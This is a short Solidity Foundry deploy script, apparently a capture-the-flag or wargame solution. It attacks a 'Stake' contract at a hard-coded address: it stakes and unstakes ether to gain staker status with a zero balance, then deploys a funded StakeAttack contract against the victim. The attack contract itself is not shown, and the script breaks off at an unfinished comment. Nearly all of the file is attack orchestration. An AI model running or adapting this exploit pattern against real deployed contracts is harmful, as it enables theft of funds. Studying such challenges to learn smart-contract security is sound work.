// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Script, console } from "forge-std/Script.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {Stake} from "../src/Stake.sol";
import {StakeAttack} from "../src/StakeAttack.sol";

contract DeployAttack is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        Stake victim = Stake(0x0B6fEe71B1F4f38164264C218D5d02A50Ed44C9c);
        victim.StakeETH{value: 0.002 ether}();
        victim.Unstake(0.002 ether);
        //my balance in stake is zero, and im a staker TRUE

        StakeAttack attackCA = (new StakeAttack){value: 0.0001 ether}(0x0B6fEe71B1F4f38164264C218D5d02A50Ed44C9c);
        // i will 
        vm.stopBroadcast();
    }
}
